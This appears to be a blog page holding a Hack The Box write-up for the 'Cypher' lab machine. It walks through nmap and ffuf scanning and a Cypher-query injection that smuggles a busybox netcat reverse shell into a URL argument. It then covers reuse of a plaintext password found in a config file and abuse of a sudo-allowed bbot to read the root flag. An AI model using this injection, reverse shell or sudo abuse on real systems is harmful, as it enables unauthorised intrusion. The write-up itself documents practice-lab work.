@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="![[Pasted image 20250305212429.png]]
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.51.171 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 20:50 CET Nmap scan report for 10.129.51.171 Host is up (0.057s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-cypher/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="![[Pasted image 20250305212429.png]]
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.51.171 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 20:50 CET Nmap scan report for 10.129.51.171 Host is up (0.057s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+  <meta itemprop="wordCount" content="2713">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="![[Pasted image 20250305212429.png]]
+Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap 10.129.51.171 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 20:50 CET Nmap scan report for 10.129.51.171 Host is up (0.057s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-cypher/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <p>![[Pasted image 20250305212429.png]]</p>
+<h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>nmap 10.129.51.171                       
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 20:50 CET
+Nmap scan report for 10.129.51.171
+Host is up (0.057s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the gedatialized port scan go to get more information from the services dien are open the ip address.</p>
+<pre tabindex="0"><code>nmap -p22,80 -sCV 10.129.51.171 -vvvv
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 20:52 CET
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+Initiating Ping Scan at 20:52
+Scanning 10.129.51.171 [4 ports]
+Completed Ping Scan at 20:52, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 20:52
+Completed Parallel DNS resolution of 1 host. at 20:52, 0.02s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 20:52
+Scanning 10.129.51.171 [2 ports]
+Discovered open port 22/tcp on 10.129.51.171
+Discovered open port 80/tcp on 10.129.51.171
+Completed Connect Scan at 20:52, 0.04s elapsed (2 total ports)
+Initiating Service scan at 20:52
+Scanning 2 services on 10.129.51.171
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 20:52 (0:00:06 remaining)
+Completed Service scan at 20:52, 6.14s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.51.171.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 1.65s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.37s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+Nmap scan report for 10.129.51.171
+Host is up, received echo-reply ttl 63 (0.021s latency).
+Scanned at 2025-03-02 20:52:17 CET for 9s
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
+|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
+80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cypher.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 20:52
+Completed NSE at 20:52, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds
+           Raw packets sent: 4 (152B) | Rcvd: 1 (28B)
+</code></pre><p>I did now go to the webpage but i didnt saw something that was interesting for me, so i started a directory enumeration to see if there was maybe a subdirectory that could be interesting.</p>
+<pre tabindex="0"><code>ffuf -u http://cypher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://cypher.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 19ms]
+api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
+about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 18ms]
+demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
+index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 18ms]
+testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 17ms]
+                        [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 16ms]
+:: Progress: [30000/30000] :: Job [1/1] :: 2040 req/sec :: Duration: [0:00:16] :: Errors: 2 ::
+</code></pre><p>There i had the testing subdir, after that i did go to the testing subdir and there i founded a .jar file. So i downloaded the file to my own machine.</p>
+<p>![[Pasted image 20250302210015.png]]</p>
+<p>After i downloaded the file, i unzipped the file so that i can go and check whats inside the file.</p>
+<pre tabindex="0"><code>unzip custom-apoc-extension-1.0-SNAPSHOT.jar 
+Archive:  custom-apoc-extension-1.0-SNAPSHOT.jar
+   creating: META-INF/
+  inflating: META-INF/MANIFEST.MF    
+   creating: com/
+   creating: com/cypher/
+   creating: com/cypher/neo4j/
+   creating: com/cypher/neo4j/apoc/
+  inflating: com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class  
+  inflating: com/cypher/neo4j/apoc/HelloWorldProcedure.class  
+  inflating: com/cypher/neo4j/apoc/CustomFunctions.class  
+  inflating: com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class  
+   creating: META-INF/maven/
+   creating: META-INF/maven/com.cypher.neo4j/
+   creating: META-INF/maven/com.cypher.neo4j/custom-apoc-extension/
+  inflating: META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml  
+  inflating: META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties
+</code></pre><p>By unzipping the files, i can see that the machine cypher has used neo4j which is used by bloodhound to make the webpage.
+There i can see that the webserver is running on the following version.</p>
+<pre tabindex="0"><code>cat MANIFEST.MF 
+Manifest-Version: 1.0
+Created-By: Maven JAR Plugin 3.4.1
+Build-Jdk-Spec: 22
+</code></pre><p>Also in one of the files i founded the following code form the following file <strong>“CustomFunctions.java”</strong> so maybe i can do a command injection to get the user that has the user flag.</p>
+<pre tabindex="0"><code>String[] command = { &#34;/bin/sh&#34;, &#34;-c&#34;, &#34;curl -s -o /dev/null --connect-timeout 1 -w %{http_code} &#34; + url };
+</code></pre><p>So now I started to look for an exploit but found nothing except the following file:
+<a href="https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection">https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection</a>
+Because of this I started to run the following command in the login page and used a listener. The code I used is the following. I found this code using the cheatsheet and the file <strong>“CustomFunctions.java”</strong> that I extracted from the <code>testing</code> folder.</p>
+<pre tabindex="0"><code>a&#39; return h.value as a UNION CALL custom.getUrlStatusCode(&#34;http://10.129.49.62:80;busybox nc 10.10.16.22 8001 -e sh;#&#34;) YIELD statusCode AS a RETURN a;//
+</code></pre><p>![[Pasted image 20250305211726.png]]</p>
+<p>Now if we go look at the listener that that I started up, you will start to see that it is connected.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/…/com/cypher/neo4j/apoc]
+└─$ nc -lvnp 8001 
+listening on [any] 8001 ...
+connect to [10.10.16.22] from (UNKNOWN) [10.129.49.62] 53066
+ls 
+bin
+bin.usr-is-merged
+boot
+cdrom
+dev
+etc
+home
+lib
+lib.usr-is-merged
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+sbin.usr-is-merged
+srv
+sys
+tmp
+usr
+var
+</code></pre><p>So now I went to look in the home and I can see that a user graphasm exists. Within this user is the user.txt file but I do not have permissions to view the file.</p>
+<pre tabindex="0"><code>neo4j@cypher:/$ cd home
+cd home
+neo4j@cypher:/home$ ls
+ls
+graphasm
+neo4j@cypher:/home$ cd grap
+cd graphasm/
+neo4j@cypher:/home/graphasm$ ls
+ls
+bbot_preset.yml  user.txt
+neo4j@cypher:/home/graphasm$ cat user
+cat user.txt 
+cat: user.txt: Permission denied
+</code></pre><p>You can see within the user that there is also another file known, if we look in this file we see that there is a user and a password known from neo4j. So with this I will be able to do something with something.</p>
+<pre tabindex="0"><code>neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
+cat bbot_preset.yml
+targets:
+  - ecorp.htb
+
+output_dir: /home/graphasm/bbot_scans
+
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.20xtCMCXkBmerhK
+neo4j@cypher:/home/graphasm$ 
+</code></pre><p>So I first went to try logging in to the ssh server with the login user neo4j with the password found above, but this was unsuccessful.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/cypher]
+└─$ ssh neo4j@10.129.49.62
+neo4j@10.129.49.62&#39;s password: 
+Permission denied, please try again.
+neo4j@10.129.49.62&#39;s password: 
+</code></pre><p>Then I went to try the same password but with the user <code>graphasm</code> because I found the file that contained this password was in the user <code>graphasm</code> and with this user I was able to successfully log in with the following credentials:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Username</th>
+          <th>Password</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>graphasm</td>
+          <td>cU4btyib.20xtCMCXkBmerhK</td>
+      </tr>
+  </tbody>
+</table>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/cypher]
+└─$ ssh graphasm@10.129.49.62
+graphasm@10.129.49.62&#39;s password: 
+Permission denied, please try again.
+graphasm@10.129.49.62&#39;s password: 
+Permission denied, please try again.
+graphasm@10.129.49.62&#39;s password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Mar  5 07:49:18 PM UTC 2025
+
+  System load:  0.0               Processes:             249
+  Usage of /:   68.6% of 8.50GB   Users logged in:       0
+  Memory usage: 24%               IPv4 address for eth0: 10.129.49.62
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Mar 5 19:49:19 2025 from 10.10.16.22
+graphasm@cypher:~$
+</code></pre><p>So, as you can see above, I am now logged in as the user graphasm and so I have found the first flag (User flag).</p>
+<p><code>User flag = e3a3204104ebe7cd3f893c48be1b6eb3</code></p>
+<pre tabindex="0"><code>graphasm@cypher:~$ cat user.txt 
+e3a3204104ebe7cd3f893c48be1b6eb3
+</code></pre><p>![[Pasted image 20250305205830.png]]</p>
+<p>So now I went to see if I can go run the command <code>sudo -l</code> to see if I can&rsquo;t go run a command with sudo privileges without having the password of the sudo user.</p>
+<pre tabindex="0"><code>graphasm@cypher:~$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+</code></pre><p>Here we see that we are going to be able to do privilege escalation by using bbot. So I started looking for different files that would explain how bbot works. I used the following two files.</p>
+<p>The first file is more about bbot itself
+<a href="https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line">https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/#yaml-config-vs-command-line</a></p>
+<p>The 2nd file is about the commands and what options you can use.
+<a href="https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/">https://www.blacklanternsecurity.com/bbot/Stable/scanning/advanced/</a></p>
+<pre tabindex="0"><code>graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ &lt;|  __ &lt;| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+[DBUG] Preset bbot_cli_main: Adding module &#34;python&#34; of type &#34;output&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;csv&#34; of type &#34;output&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;stdout&#34; of type &#34;output&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;json&#34; of type &#34;output&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;txt&#34; of type &#34;output&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;aggregate&#34; of type &#34;internal&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;dnsresolve&#34; of type &#34;internal&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;cloudcheck&#34; of type &#34;internal&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;excavate&#34; of type &#34;internal&#34;
+[DBUG] Preset bbot_cli_main: Adding module &#34;speculate&#34; of type &#34;internal&#34;
+[VERB] 
+[VERB] ### MODULES ENABLED ###
+[VERB] 
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | Module     | Type     | Needs API Key   | Description                   | Flags         | Consumed Events      | Produced Events    |
+[VERB] +============+==========+=================+===============================+===============+======================+====================+
+[VERB] | csv        | output   | No              | Output to CSV                 |               | *                    |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | json       | output   | No              | Output to Newline-Delimited   |               | *                    |                    |
+[VERB] |            |          |                 | JSON (NDJSON)                 |               |                      |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | python     | output   | No              | Output via Python API         |               | *                    |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | stdout     | output   | No              | Output to text                |               | *                    |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | txt        | output   | No              | Output to text                |               | *                    |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | cloudcheck | internal | No              | Tag events by cloud provider, |               | *                    |                    |
+[VERB] |            |          |                 | identify cloud resources like |               |                      |                    |
+[VERB] |            |          |                 | storage buckets               |               |                      |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | dnsresolve | internal | No              |                               |               | *                    |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | aggregate  | internal | No              | Summarize statistics at the   | passive, safe |                      |                    |
+[VERB] |            |          |                 | end of a scan                 |               |                      |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | excavate   | internal | No              | Passively extract juicy       | passive       | HTTP_RESPONSE,       | URL_UNVERIFIED,    |
+[VERB] |            |          |                 | tidbits from scan data        |               | RAW_TEXT             | WEB_PARAMETER      |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] | speculate  | internal | No              | Derive certain event types    | passive       | AZURE_TENANT,        | DNS_NAME, FINDING, |
+[VERB] |            |          |                 | from others by common sense   |               | DNS_NAME,            | IP_ADDRESS,        |
+[VERB] |            |          |                 |                               |               | DNS_NAME_UNRESOLVED, | OPEN_TCP_PORT,     |
+[VERB] |            |          |                 |                               |               | HTTP_RESPONSE,       | ORG_STUB           |
+[VERB] |            |          |                 |                               |               | IP_ADDRESS,          |                    |
+[VERB] |            |          |                 |                               |               | IP_RANGE, SOCIAL,    |                    |
+[VERB] |            |          |                 |                               |               | STORAGE_BUCKET, URL, |                    |
+[VERB] |            |          |                 |                               |               | URL_UNVERIFIED,      |                    |
+[VERB] |            |          |                 |                               |               | USERNAME             |                    |
+[VERB] +------------+----------+-----------------+-------------------------------+---------------+----------------------+--------------------+
+[VERB] Loading word cloud from /root/.bbot/scans/vile_mark/wordcloud.tsv
+[DBUG] Failed to load word cloud from /root/.bbot/scans/vile_mark/wordcloud.tsv: [Errno 2] No such file or directory: &#39;/root/.bbot/scans/vile_mark/wordcloud.tsv&#39;
+[INFO] Scan with 0 modules seeded with 0 targets (0 in whitelist)
+[WARN] No scan modules to load
+[DBUG] Installing dnsresolve - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;dnsresolve&#34;
+[DBUG] Installing python - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;python&#34;
+[DBUG] Installing cloudcheck - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;cloudcheck&#34;
+[DBUG] Installing excavate - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;excavate&#34;
+[DBUG] Installing csv - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;csv&#34;
+[DBUG] Installing json - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;json&#34;
+[DBUG] Installing stdout - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;stdout&#34;
+[DBUG] Installing speculate - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;speculate&#34;
+[DBUG] Installing aggregate - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;aggregate&#34;
+[DBUG] Installing txt - Preloaded Deps {&#39;modules&#39;: [], &#39;pip&#39;: [], &#39;pip_constraints&#39;: [], &#39;shell&#39;: [], &#39;apt&#39;: [], &#39;ansible&#39;: [], &#39;common&#39;: []}
+[DBUG] No dependency work to do for module &#34;txt&#34;
+[VERB] Loading 0 scan modules: 
+[VERB] Loading 5 internal modules: aggregate,cloudcheck,dnsresolve,excavate,speculate
+[VERB] Loaded module &#34;aggregate&#34;
+[VERB] Loaded module &#34;cloudcheck&#34;
+[VERB] Loaded module &#34;dnsresolve&#34;
+[VERB] Loaded module &#34;excavate&#34;
+[VERB] Loaded module &#34;speculate&#34;
+[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
+[VERB] Loading 5 output modules: csv,json,python,stdout,txt
+[VERB] Loaded module &#34;csv&#34;
+[VERB] Loaded module &#34;json&#34;
+[VERB] Loaded module &#34;python&#34;
+[VERB] Loaded module &#34;stdout&#34;
+[VERB] Loaded module &#34;txt&#34;
+[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
+[VERB] Setting up modules
+[DBUG] _scan_ingress: Setting up module _scan_ingress
+[DBUG] _scan_ingress: Finished setting up module _scan_ingress
+[DBUG] dnsresolve: Setting up module dnsresolve
+[DBUG] dnsresolve: Finished setting up module dnsresolve
+[DBUG] aggregate: Setting up module aggregate
+[DBUG] aggregate: Finished setting up module aggregate
+[DBUG] cloudcheck: Setting up module cloudcheck
+[DBUG] cloudcheck: Finished setting up module cloudcheck
+[DBUG] internal.excavate: Setting up module excavate
+[DBUG] internal.excavate: Including Submodule CSPExtractor
+[DBUG] internal.excavate: Including Submodule EmailExtractor
+[DBUG] internal.excavate: Including Submodule ErrorExtractor
+[DBUG] internal.excavate: Including Submodule FunctionalityExtractor
+[DBUG] internal.excavate: Including Submodule HostnameExtractor
+[DBUG] internal.excavate: Including Submodule JWTExtractor
+[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor
+[DBUG] internal.excavate: Including Submodule ParameterExtractor
+[DBUG] internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAMETER events
+[DBUG] internal.excavate: Including Submodule SerializationExtractor
+[DBUG] internal.excavate: Including Submodule URLExtractor
+[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
+[DBUG] internal.excavate: Final combined yara rule contents: b6eb7f423499dde71c03dc018f5aaab7
+</code></pre><p>As you can see above I was able to read the root.txt file so I was also able to grab the root flag.</p>
+<p><code>root flag = b6eb7f423499dde71c03dc018f5aaab7</code></p>
+<p>![[Pasted image 20250305210843.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
